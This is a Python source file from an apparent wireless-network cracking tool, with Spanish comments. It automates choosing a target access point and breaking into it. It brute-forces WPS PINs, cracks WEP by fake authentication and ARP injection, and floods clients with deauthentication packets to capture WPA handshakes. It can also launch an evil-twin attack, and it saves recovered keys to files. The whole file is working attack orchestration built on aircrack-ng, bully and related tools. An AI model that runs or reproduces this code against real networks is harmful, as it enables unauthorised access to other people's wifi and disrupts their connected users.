import time
import os
from pandora.utils.exceptions import TargetAPNotFoundError
from pandora.core import eviltwin as eviltwin_mod, deauth as deauther
from pandora.shell import airodump, aireplay, aircrack, bully, wash, cowpatty, netinfo
from pandora.config import TARGET_SSID, WPS_PIN, TIMEOUT_WPS, TIMEOUT_WEP, DEBUG
from pandora.definitions import TEMP_PATH
from pandora.utils.utils import delete_if_exists
from pandora.definitions import PASSWORDS_PATH

ADUMP = airodump.Airodump()
DEAUTH = deauther.Deauth(ADUMP)
APLAY = aireplay.Aireplay()
ACRACK = aircrack.Aircrack()
BULLY = bully.Bully()
WASH = wash.Wash()
COW = cowpatty.Cowpatty()
IWCONFIG = netinfo.Iwconfig()
IFCONFIG = netinfo.Ifconfig()

# Esta funcion devuelve si pudo crackear la red objetivo.
#DEVNULL = open(os.devnull, "wb")


def crack_tree(ifname, eviltwin=False, ifname_hostapd=None):
    """Decision tree for cracking a wifi network
        If WPS cracking was a success return 1
        If WEP cracking was a success return 2
        If WPA cracking was a success return 3
        If Evil Twin cracking was a success return 4
        Else return -1"""
    wps_success = wep_success = wpa_success = et_success = False
    access_points, hosts = ADUMP.get_airodump(ifname, 20)
    try:
        target_ap = ADUMP.get_target_ap(TARGET_SSID)
    except TargetAPNotFoundError:
        print(f"The target access point {TARGET_SSID} was not found.")
        target_ap = choose_ap_to_attack(access_points)
    os.system("killall -s SIGKILL airodump-ng")
    print(f"Red Objetivo: {target_ap['ESSID']}")
    if not eviltwin:
        protocol = target_ap.get('Privacy')
        washlist = WASH.get_wps_info(ifname)
        print("Cracking...")
        print(f"Red objetivo: {target_ap.get('ESSID')}")
        print(f'Protocolo: {protocol}')
        perform_wps = False
        print(washlist)
        for washelement in washlist:
            if washelement.get('BSSID') == target_ap.get('BSSID') and washelement.get('Lck') == 'No':
                perform_wps = True
                break
        if perform_wps:
            print("Crackeando WPS")
            wps_success = _wps(target_ap, ifname)

        if wps_success:
            print("Clave obtenida con exito, conectar")
        else:
            if "WPA" in protocol:
                connected_hosts = ADUMP.get_connected_hosts(
                    target_ap.get('BSSID'))
                wpa_success = _wpa(ifname, connected_hosts, target_ap)
            elif "WEP" in protocol:
                wep_success = _wep(target_ap, ifname)
    else:
        target_ap_bssid = target_ap.get('BSSID')
        et_success = eviltwin_mod.start(
            ifname, ifname_hostapd, target_ap_bssid, ADUMP)

    if wps_success:
        return 1
    elif wep_success:
        return 2
    elif wpa_success:
        return 3
    elif et_success:
        return 4
    else:
        return -1


def choose_ap_to_attack(access_points):
    choice = -1
    choices = []
    while choice not in choices:
        choices = []
        print("Choose a network to attack")
        for idx, ap in enumerate(access_points):
            choices.append(str(idx))
            print(f"{idx}: {ap['ESSID']} ({ap['Power']})")
        choice = input()
    choice = int(choice)
    return access_points[choice]


def _wpa(interface, connected_hosts, target_network):
    file_path = capture_handshake(
        connected_hosts, target_network, 'wpa_crack_handshake', interface)
    os.system("killall airodump-ng")
    os.system("killall aireplay-ng")

    # Restaurar conexion a internet si no tenemos una interfaz con conexion a internet.
    # interface_manager = ifmanager.InterfaceManager()
    # interface_manager.switch_mode(interface, 'Managed')
    # os.system("service NetworkManager restart")
    # os.system("service wpa_supplicant restart")
    # time.sleep(30)
    # while True:
    #     internet_connection = bool_internet_connection()
    #     if internet_connection:
    #         break
    #     else:
    #         time.sleep(20)
    # Aca termina la restauracion

    out = ACRACK.online_wpa_crack(file_path)
    # os.system("service NetworkManager start")
    # os.system("service wpa_supplicant start")
    # os.system("ifconfig eth0 down")
    # os.system("iwconfig wlan0 mode Managed")
    # os.system("ifconfig wlan0 up")
    print(out)
    return True


def _wps(network, interface):
    wps_output = BULLY.bully(network, interface, pin=WPS_PIN)
    # print(wps_output)
    if wps_output.find('WPS PIN') != -1:
        print("Clave encontrada")
        _write_pw_to_file('wps.txt', wps_output)
        print(wps_output)
        return True
    else:
        print("Ataque WPS sin exito")
        return False


def _write_pw_to_file(name, output):
    filepath = os.path.join(PASSWORDS_PATH, name)
    with open(filepath, 'w+') as fh:
        fh.write(output)


def _wep(network, interface):
    os.system("killall airodump-ng")
    print("Comenzando Cracking de WEP")
    delete_if_exists(os.path.join(TEMP_PATH, 'ivs_wep_temp-01.cap'))
    adump = ADUMP.capture_airodump_network(
        interface, network, 'ivs_wep_temp')
    # adump  = subprocess.Popen(["airodump-ng", "-c",network.get('channel'),"--bssid",network.get('BSSID'),"-o","pcap","-w","pandora/temp/ivs_wep_temp",interface], stdout=DEVNULL, stderr=DEVNULL, stdin = DEVNULL)
    time.sleep(10)

    print("Realizamos un fake deauth")
    os.system("iwconfig wlan0 channel " + network.get('channel'))
    print(APLAY.fake_auth(network.get('BSSID'), interface))
    time.sleep(5)
    arp_pid = APLAY.arp_inject(network.get("BSSID"), interface)
    tiempo_espera = TIMEOUT_WEP/60
    print("Ahora esperamos " + str(tiempo_espera)+" minutos")
    time.sleep(TIMEOUT_WEP)
    aircrack_output = ACRACK.crack_wep()
    adump.kill()
    arp_pid.kill()
    return _check_wep_and_write(aircrack_output)


def _check_wep_and_write(aircrack_output):
    if aircrack_output.find("KEY FOUND") != -1:
        _write_pw_to_file('wep.txt', aircrack_output)
        print(aircrack_output)
        return True
    else:
        print("Intento fallido, hay que recolectar mas IVS")
        return False

# def get_target_ap(access_points):
#     target_ap = None
#     power = float('-inf')
#     if TARGET_SSID == '':
#         for access_point in access_points:
#             if access_point.get("Power") > power:
#                 target_ap = access_point
#                 power = access_point.get("Power")
#     else:
#         for access_point in access_points:
#             target_ap = access_point if access_point.get('ESSID') == TARGET_SSID else target_ap
#     return target_ap

# def get_connected_hosts(hosts, target_ap):
#     connected_hosts = []
#     for host in hosts:
#         print(host)
#         if host.get('BSSID') == target_ap.get("BSSID"):
#             connected_hosts.append(host)
#     return connected_hosts


def bool_handshake_file(file_path):
    cow = COW.check_wpa_handshake(file_path)
    if DEBUG:
        print(cow)
    if cow.find("Collected") != -1:
        return True
    else:
        return False


def capture_handshake(connected_hosts, target_network, file_name, interface):

    os.system("killall airodump-ng")
    file_path = os.path.join(TEMP_PATH, file_name+"-01.cap")
    delete_if_exists(file_path)
    print(f"Configurando interfaz {interface}")
    IWCONFIG.set_channel(interface, target_network.get('channel'))
    # msg = IFCONFIG.down(interface)
    # os.system(f"iwconfig {interface} channel " + target_network.get('channel'))
    # os.system(f"ifconfig {interface} down")
    # while 1:
    #     msg = APLAY.test_ap(target_network.get('BSSID'), interface)
    #     if DEBUG:
    #         print(msg)
    #     if msg.find("Injection is working") != -1:
    #         break
    #     match = re.search(r"AP\suses\schannel\s\d{1,2}", msg)
    #     channel = match[0].replace('AP uses channel ', '')
    #     IWCONFIG.set_channel(interface, channel)
    print("Deautenticando hosts y capturando handshake")
    proc_airodump = ADUMP.capture_airodump_network(
        interface, target_network, file_name)
    while True:
        deauth_hosts(connected_hosts, 15, interface, target_network)
        time.sleep(10)
        if not bool_handshake_file(file_path):
            print("Esperamos al handshake")
        else:
            print("Handshake capturado exitosamente")
            proc_airodump.kill()
            return file_path


def deauth_hosts(connected_hosts, packets, ifname, target_network):
    deauth_pids = []
    target_network_bssid = target_network.get('BSSID')
    if connected_hosts:
        for host in connected_hosts:
            print("Por deautenticar el host: "+host.get('Station MAC') +
                  " con "+str(packets)+" paquetes de deauth")
            host_mac = host.get('Station MAC')
            pid = APLAY.deauth(target_network_bssid,
                               host_mac, ifname, packets, None)
            deauth_pids.append(pid)
    else:
        pid = APLAY.deauth_ap(target_network_bssid, ifname, 15)
        deauth_pids.append(pid)

    return deauth_pids
